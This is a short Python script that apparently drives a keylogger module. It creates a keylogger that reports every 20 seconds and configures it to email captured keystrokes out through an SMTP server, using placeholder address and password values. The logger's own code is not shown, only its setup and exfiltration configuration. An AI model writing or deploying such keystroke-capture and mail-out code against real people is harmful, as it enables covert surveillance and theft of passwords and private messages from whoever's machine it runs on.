from keylogger import Keylogger

my_keylogger = Keylogger(20) # 20 second
my_keylogger.configure_mail('me@mail.com', 'password', 'smtp.mail.com', 999)